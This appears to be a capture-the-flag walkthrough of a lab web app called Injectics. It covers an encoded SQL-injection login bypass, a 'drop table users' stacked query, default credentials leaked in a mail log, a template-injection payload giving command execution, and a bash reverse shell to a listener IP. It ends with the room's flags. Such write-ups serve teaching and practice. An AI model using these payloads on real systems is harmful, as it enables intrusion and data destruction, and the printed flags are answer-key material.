# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | ssh |
| 80 | http |



# RECONNAISSANCE
---

![Pasted image 20250506130424.png](../../IMAGES/Pasted%20image%2020250506130424.png)




Let's fuzz:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://injectics.thm/FUZZ" -ic -c -t 200 -e .php

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://injectics.thm/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .php
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.php [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3801ms]
index.php [Status: 200, Size: 6588, Words: 2560, Lines: 207, Duration: 3813ms]
flags [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 179ms]
login.php [Status: 200, Size: 5401, Words: 1972, Lines: 162, Duration: 5859ms]
css [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 179ms]
js [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 180ms]
javascript [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 179ms]
logout.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 179ms]
vendor [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 181ms]
dashboard.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 182ms]
functions.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 262ms]
```

If we to the login page, we can see this:


![Pasted image 20250506130452.png](../../IMAGES/Pasted%20image%2020250506130452.png)

Let's try basic injection on the email:


![Pasted image 20250506130521.png](../../IMAGES/Pasted%20image%2020250506130521.png)



![Pasted image 20250506130529.png](../../IMAGES/Pasted%20image%2020250506130529.png)

As seen, we got an alert saying invalid keywords are detected, Let's submit the request to our proxy:

![Pasted image 20250506130854.png](../../IMAGES/Pasted%20image%2020250506130854.png)

As seen, there seems to be some sort of filter, let's try encoding it in a more advanced way:

```
%27%20||%201=1%20--+
```

![Pasted image 20250506131047.png](../../IMAGES/Pasted%20image%2020250506131047.png)

As seen, we are able to bypass the filter, let's forward the request and check the panel:

![Pasted image 20250506131153.png](../../IMAGES/Pasted%20image%2020250506131153.png)

We can edit actions, let's proceed to exploitation.


# EXPLOITATION
---

If we go to the edit section, we can see this:

![Pasted image 20250506131238.png](../../IMAGES/Pasted%20image%2020250506131238.png)

Let's send a basic request to view the format of it:


![Pasted image 20250506131513.png](../../IMAGES/Pasted%20image%2020250506131513.png)

As seen, it says that there was an error updating there must be another way, let's try to close the `sql` statement by using `;` and drop the users table:

```
1; drop table users -- -
```

![Pasted image 20250506132247.png](../../IMAGES/Pasted%20image%2020250506132247.png)


Seems like we are missing something, as it says, the table `users` got deleted, let's go back to our main application and check everything:

![Pasted image 20250506132415.png](../../IMAGES/Pasted%20image%2020250506132415.png)

I forgot to check the source code, it says we got a file named `mail.log`, let's check it out:

```
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email | Password 	 |
|---------------------------|-------------------------|
| superadmin@injectics.thm | superSecurePasswd101 |
| dev@injectics.thm | devPasswd123 |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm
```


Now we understand, it seems that, by deleting the `users` table, we can use those default credentials to get access as the admin user on the panel, let's try:


![Pasted image 20250506142732.png](../../IMAGES/Pasted%20image%2020250506142732.png)

There we go, we got in as admin and got our first flag:

```
THM{INJECTICS_ADMIN_PANEL_007}
```


# Second Flag
---

Now, as we can see, a new option was added to our dashboard, we can see the `profile` section:


![Pasted image 20250506142950.png](../../IMAGES/Pasted%20image%2020250506142950.png)

As seen, we are able to update our email, first name and last name, let's send the request to our proxy so we can analyze it:

![Pasted image 20250506143115.png](../../IMAGES/Pasted%20image%2020250506143115.png)

Since we can see that `admin` is reflected on the dashboard main page, if we change the `fname` to something else, it could be reflected on there again, if this works, we are dealing with `SSTI`, let's test it out:

![Pasted image 20250506143213.png](../../IMAGES/Pasted%20image%2020250506143213.png)


![Pasted image 20250506143224.png](../../IMAGES/Pasted%20image%2020250506143224.png)

![Pasted image 20250506143243.png](../../IMAGES/Pasted%20image%2020250506143243.png)

As seen, this is vulnerable to `SSTI`, now, we must identify the template engine, let's do it:

```jinja2
{{}}
```

After using that payload, i got this:

![Pasted image 20250506143500.png](../../IMAGES/Pasted%20image%2020250506143500.png)

This means that the template engine we are dealing with is `jinja2`, based on that, we can achieve `rce` by doing:

```jinja2
{{['id',""]|sort('passthru')}}
```

![Pasted image 20250506143705.png](../../IMAGES/Pasted%20image%2020250506143705.png)

As seen we can achieve `rce`, let's send a reverse shell using:

```jinja2
{{["bash -c 'exec bash -i >& /dev/tcp/10.11.136.34/9001 0>&1'",""]|sort('passthru')}}
```

If we check our listener:

![Pasted image 20250506144244.png](../../IMAGES/Pasted%20image%2020250506144244.png)

```
www-data@injectics:/var/www/html$ ls -la
ls -la
total 548
drwxr-xr-x 6 ubuntu ubuntu 4096 Jul 31 2024 .
drwxr-xr-x 3 root root 4096 Jul 19 2024 ..
-rw-rw-r-- 1 ubuntu ubuntu 1024 Jul 31 2024 .conn.php.swp
-rw-r--r-- 1 ubuntu ubuntu 121 Jul 31 2024 .htaccess
-rw-rw-r-- 1 ubuntu ubuntu 7370 Jul 23 2024 adminLogin007.php
-rw-r--r-- 1 ubuntu ubuntu 433129 Jul 18 2024 banner.jpg
-rw-r--r-- 1 ubuntu ubuntu 48 Jul 17 2024 composer.json
-rw-r--r-- 1 ubuntu ubuntu 8723 Jul 17 2024 composer.lock
-rw-r--r-- 1 ubuntu ubuntu 2867 Jul 31 2024 conn.php
drwxrwxr-x 2 ubuntu ubuntu 4096 Jul 18 2024 css
-rw-r--r-- 1 ubuntu ubuntu 7499 Jul 23 2024 dashboard.php
-rw-rw-r-- 1 ubuntu ubuntu 7227 Jul 23 2024 edit_leaderboard.php
drwxrwxr-x 2 ubuntu ubuntu 4096 Jul 18 2024 flags
-rw-r--r-- 1 ubuntu ubuntu 2101 Jul 22 2024 functions.php
-rw-r--r-- 1 ubuntu ubuntu 6083 Jul 23 2024 index.php
-rwxrwxr-x 1 ubuntu ubuntu 3947 Jul 23 2024 injecticsService.php
drwxrwxr-x 2 ubuntu ubuntu 4096 Jul 18 2024 js
-rw-r--r-- 1 ubuntu ubuntu 5538 Jul 23 2024 login.php
-rw-r--r-- 1 ubuntu ubuntu 99 Jun 16 2024 logout.php
-rw-rw-r-- 1 ubuntu ubuntu 1098 Jul 23 2024 mail.log
-rw-r--r-- 1 ubuntu ubuntu 1088 Jul 23 2024 script.js
-rw-r--r-- 1 ubuntu ubuntu 1432 May 16 2023 styles.css
-rw-rw-r-- 1 ubuntu ubuntu 6786 Jul 23 2024 update_profile.php
drwxr-xr-x 6 ubuntu ubuntu 4096 Jul 17 2024 vendor
www-data@injectics:/var/www/html$ ls -la flags
ls -la flags
total 12
drwxrwxr-x 2 ubuntu ubuntu 4096 Jul 18 2024 .
drwxr-xr-x 6 ubuntu ubuntu 4096 Jul 31 2024 ..
-rw-rw-r-- 1 ubuntu ubuntu 38 Jul 18 2024 5d8af1dc14503c7e4bdc8e51a3469f48.txt
```

There we go, we got our flag:

```
www-data@injectics:/var/www/html$ cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt
THM{5735172b6c147f4dd649872f73e0fdea}
```

![Pasted image 20250506144758.png](../../IMAGES/Pasted%20image%2020250506144758.png)


